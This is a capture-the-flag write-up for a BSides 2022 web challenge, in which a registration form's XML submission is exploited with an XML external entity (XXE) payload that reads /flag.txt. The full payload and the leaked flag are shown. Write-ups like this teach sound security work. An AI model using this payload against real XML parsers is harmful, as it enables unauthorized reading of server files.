---
title: bsides2022 – Extreme
tags: xxe
---

## Challenge

> The system is full, everyone. Go home. We've already registered everyone.

The provided website is a registration form (fields `Name`, `Email`, `Password`) that always returns an error: `Sorry, [Email] is already registered!` with the entered email address.

## Solution

Looking at the source code of the website, when submitting the form, the following code is run:

```js
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<root>' +
        '<name>' + $('#name').val() + '</name>' +
        '<email>' + $('#email').val() + '</email>' +
        '<password>' + $('#password').val() + '</password>' +
        '</root>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","process.php",true);
    xmlhttp.send(xml);
};
```

This composes a XML file and sends it to `process.php`. Trying that in a REST client like [Insomnia](https://insomnia.rest), we see that all fields but `email` are ignored.

We can then construct a custom XML file that tries to load an other file on disk and includes that as the email address (because it then gets sent back to us):

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<root>
<email>&xxe;</email>
</root>
```

This is called a [XXE (XML external entity attack)](https://en.wikipedia.org/wiki/XML_external_entity_attack).

And voilà, we get our flag:

```
Sorry, flag{bad_XML_ext3rnal_entiti3s} is already registered!
```

